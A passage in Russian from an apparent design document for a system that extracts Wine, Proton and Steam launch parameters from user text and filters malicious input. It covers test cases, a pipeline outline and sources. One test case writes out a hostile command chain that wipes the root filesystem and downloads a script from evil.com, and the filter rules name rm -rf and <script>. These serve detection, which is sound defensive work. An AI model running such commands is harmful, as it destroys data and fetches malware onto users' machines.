+Примеры тестовых случаев:
+Безопасный: «Запускать с Wine-6.0, поставить WINEPREFIX=~/games/gprefix и добавить -novid». Ожидается извлечение WineVersion: 6.0, WINEPREFIX, LaunchOption -novid. Система должна признать всё «безопасным» и извлечь параметры.
+Двусмысленный: «runwithwine.exe — нормально ли это?» Содержит wine.exe (может быть командой) и вопрос. Здесь нечего извлекать: это безвредная болтовня. Система должна «ничего не найти» (или найти только Executable “runwithwine.exe” с низкой уверенностью) и не предлагать несущественных твиков.
+Вредоносный: «sudo rm -rf /; cd /root; wget http://evil.com/virus.sh». Здесь должны сработать фильтры (определить как malicious и отказаться от обработки). Параметры не извлекаем, обращение уходим в блок «отклонено».
+Тесты должны покрывать разные языковые конструкции: императив («запусти так: …»), описательный стиль (роман с «инструкцией» внутри), список команд через точку с запятой, цифры/спецсимволы.
+
+Вывод: Построенная система должна точно разделять корректные игровые твики и «шум». Использование источников Proton/Wine/Steam (см. привязки к документации
+) повышает обоснованность извлечения. Совокупность правил и ML-подхода позволяет фильтровать вредные команды, а богатая схема вывода обеспечивает наглядность результата.
+
+Чистый
+
+Вредонос/шум
+
+Пользовательский текст
+
+Фильтрация
+
+Парсинг и извлечение
+
+Отклонено
+
+Формирование JSON
+
+Генерация рекомендаций
+
+
+
+Show code
+Категории
+
+«-novid», «-fullscreen»
+
+«PROTON_LOG=1», «WINEPREFIX=/home»
+
+«Proton 10.0», «Wine 7.0»
+
+«d3d9=n», «dxvk=b»
+
+«изменить game.ini», «добавить ключ в .reg»
+
+
+
+Show code
+Источники: Официальная документация Proton содержит список переменных окружения и флагов (например, PROTON_USE_WINED3D, PROTON_NO_D3D11 и др.)
+. Руководство Steam отмечает, что в Launch Options можно указывать всё до %command%: переменные, команды и параметры
+. Практические гайды по Wine описывают WINEPREFIX, WINEARCH и другие переменные
+. Рекомендации по фильтрации небезопасного ввода следуют из известных паттернов атаки (например, rm -rf, <script>)
+. Эти материалы легли в основу предложенного подхода.
